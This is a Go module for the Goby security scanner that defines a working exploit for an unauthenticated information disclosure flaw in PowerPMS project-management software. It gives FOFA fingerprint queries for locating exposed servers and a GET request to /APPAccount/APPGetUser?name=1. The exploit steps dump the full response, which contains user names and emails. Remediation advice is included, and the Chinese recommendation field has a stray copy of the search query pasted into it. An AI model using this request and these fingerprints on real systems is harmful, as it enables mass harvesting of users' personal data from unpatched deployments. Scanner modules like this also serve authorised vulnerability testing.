package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "PowerPMS /APPAccount/APPGetUser Information Disclosure Vulnerability",
    "Description": "<p>PowerPMS is a powerful project management software designed to help teams effectively organize and manage projects.</p><p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Product": "Powerpms-PowerPMS",
    "Homepage": "http://www.powerpms.com/",
    "DisclosureDate": "2024-06-04",
    "PostTime": "2024-06-21",
    "Author": "mayuze@baimaohui.net",
    "FofaQuery": "body=\"Power.login.init\" && body=\"Power.ui.warning\"",
    "GobyQuery": "body=\"Power.login.init\" && body=\"Power.ui.warning\"",
    "Level": "1",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.powerpms.com/\">http://www.powerpms.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/APPAccount/APPGetUser?name=1",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"EMAIL\":",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"NAME\":",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/APPAccount/APPGetUser?name=1"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/APPAccount/APPGetUser?name=1",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.4",
    "Translation": {
        "CN": {
            "Name": "PowerPMS /APPAccount/APPGetUser 信息泄露漏洞",
            "Product": "普华科技-PowerPMS",
            "Description": "<p>PowerPMS是一款功能强大的项目管理软件，旨在帮助团队有效地组织和管理项目。<br></p><p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.powerpms.com/\">http://www.powerpms.com/</a>body=\"Power.login.init\" &amp;&amp; body=\"Power.ui.warning\"</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "PowerPMS /APPAccount/APPGetUser Information Disclosure Vulnerability",
            "Product": "Powerpms-PowerPMS",
            "Description": "<p>PowerPMS is a powerful project management software designed to help teams effectively organize and manage projects.<br></p><p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.powerpms.com/\">http://www.powerpms.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10963"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}